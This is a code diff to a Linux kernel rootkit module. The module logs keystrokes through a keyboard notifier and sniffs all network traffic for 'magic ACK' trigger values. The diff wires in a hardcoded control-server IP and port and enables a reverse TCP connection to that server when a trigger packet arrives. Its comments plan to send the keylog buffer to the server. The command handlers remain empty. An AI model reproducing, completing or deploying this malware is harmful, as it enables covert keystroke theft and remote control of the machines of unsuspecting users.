@@ -28,7 +28,6 @@
 
 #include <linux/keyboard.h>				/* Used for keyboard_notifier.		*/
 #include <linux/syscalls.h>				/* Used for syst calls (kern/usr).  */
-#include <linux/kthread.h>				/* Used to create network thread.   */
 
 #define KEYBOARD_BUFFER_SIZE 10000000	/* Allocate 10MB for keylog buffer. */
 
@@ -61,7 +60,10 @@ struct socket      *sock;
 /**
  * REVERSE TCP SHELL FUNCTIONALITY
 **/
+unsigned long  int server_ip; 			/* set to binary form of 192.168.56.200, or 0xC0A838C8  */
+unsigned short int server_port;			/* set to binary form of 14683, or 0x395B				*/
 int connection_state;
+
 unsigned long int acks[] =
 {
 	2035414082,
@@ -85,6 +87,7 @@ unsigned long int acks[] =
 	1671908051,
 	922525094
 };
+
 
 /**
  * Correlates with the key definitions found in:
@@ -182,10 +185,11 @@ int notification(struct notifier_block *nblock, unsigned long code, void *_param
 					/**
 					if (connection_state)
 						// send buffer to control server
+						// flush buffer
 					else
 						// switch to userspace
-						// write butter to file
-						// exit userspace to kernelspace
+						// write buffer to file
+						// exit userspace
 					**/
 				}
 			}
@@ -204,24 +208,17 @@ static struct notifier_block nb =
 
 void reverse_connect(void)
 {
-	// unsigned long  int server_ip;
-	// unsigned short int server_port;
-
 	printk("Initializing network socket.\n");
 	if(sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock) < 0)
 	{
 		printk("Error in creating socket.\n");
 	}
 
-	/**
-	 * server_ip and server_port are still undefined.
-	**/
 	memset(&sock_in, 0, sizeof(sock_in));
-	//sock_in.sin_addr.s_addr = htonl(server_ip);
+	sock_in.sin_addr.s_addr = htonl((unsigned long) 0xC0A838C8);
 	sock_in.sin_family = AF_INET;
-	//sock_in.sin_port = htons(server_port);
+	sock_in.sin_port = htons((unsigned short) 0x395B);
 
-	/**
 	printk("Attempting to connect to server [expected not to].\n");
 	if (sock->ops->connect(sock, (struct sockaddr*)&sock_in, sizeof(sock_in), 0) < 0)
 		printk("Could not connect [expected].\n");
@@ -230,11 +227,10 @@ void reverse_connect(void)
 		connection_state = CONNECTED;
 		printk("Connected to server.\n");
 	}
-	**/
 }
 
 
-/* Up to 20 different commands. */
+/* Up to 20 (or more) different commands. */
 void handle_command(unsigned long int ack_seq)
 {
 	printk("Handling: %lu\n", ack_seq);
@@ -246,25 +242,25 @@ void handle_command(unsigned long int ack_seq)
 			break;
 		case 1039496434:
 			break;
-		case 455162575:
+		case 455162575 :
 			break;
 		case 1256802356:
 			break;
-		case 121160666:
+		case 121160666 :
 			break;
-		case 775584247:
+		case 775584247 :
 			break;
-		case 400038231:
+		case 400038231 :
 			break;
-		case 966583691:
+		case 966583691 :
 			break;
 		case 1678453465:
 			break;
-		case 653897989:
+		case 653897989 :
 			break;
 		case 1891123724:
 			break;
-		case 584692231:
+		case 584692231 :
 			break;
 		case 1540142942:
 			break;
@@ -274,11 +270,11 @@ void handle_command(unsigned long int ack_seq)
 			break;
 		case 1698886690:
 			break;
-		case 763403905:
+		case 763403905 :
 			break;
 		case 1671908051:
 			break;
-		case 922525094:
+		case 922525094 :
 			break;
 		default:
 			break;
@@ -309,10 +305,6 @@ int packet_rcv(struct sk_buff *skb, struct net_device *dev,
 		seq     = ntohl(tcp_header->seq);
 		printk("ack_seq: %lu\n", ack_seq);
 		printk("seq:     %lu\n", seq);
-
-		/* Use after magic 'ACK' was received. Refer to 'acks'.       */
-		/* Server IP and Port could be enumerated from"magic ACK".    */
-		/* Could have numerous magic ACK's in a magic list!			  */
 		
 		for (i = 0; i < 20; i++)
 		{
@@ -322,10 +314,9 @@ int packet_rcv(struct sk_buff *skb, struct net_device *dev,
 				{
 					printk("Would attempt to connect.\n");
 					connection_state = CONNECTED;
-					//reverse_connect();
-					// or, if ack_seq enumerates server ip / port..
-					// reverse_connect(ack_seq);
+					reverse_connect();
 				}
+
 				else
 					handle_command(ack_seq);
 			}
@@ -337,18 +328,13 @@ int packet_rcv(struct sk_buff *skb, struct net_device *dev,
 }
 
 
-int start_listen(void *args)
+void start_listen(void)
 {
 	printk("Starting network sniffing.\n");
 	net_proto.type = htons(ETH_P_ALL);
 	net_proto.dev  = NULL;
 	net_proto.func = packet_rcv;
 	dev_add_pack(&net_proto);
-
-	printk("Stopping network-listening thread.\n");
-	kthread_stop(net_thread);
-
-	return 0;
 }
 
 
@@ -361,6 +347,7 @@ int start_listen(void *args)
  *   - Configure rootkit to be a client.
  *     + Will connect to the control-server on the 192.168.1.0/24 subnet.
  *     + This connection is, thus, a reverse-TCP connection.
+ *   - Seed for randomly generated magic "ACK"s?
 **/
 int start(void)
 {
@@ -371,9 +358,11 @@ int start(void)
 	keyboard_index = 0;
 
 	printk("Starting network-listening thread.\n");
-	net_thread = kthread_create(start_listen, NULL, "network_listener");
-	wake_up_process(net_thread);
+	start_listen();
 	connection_state = DISCONNECTED;
+
+	server_ip   = 0xC0A838C8;
+	server_port = 0x395B    ; 
 
 	return 0;
 }
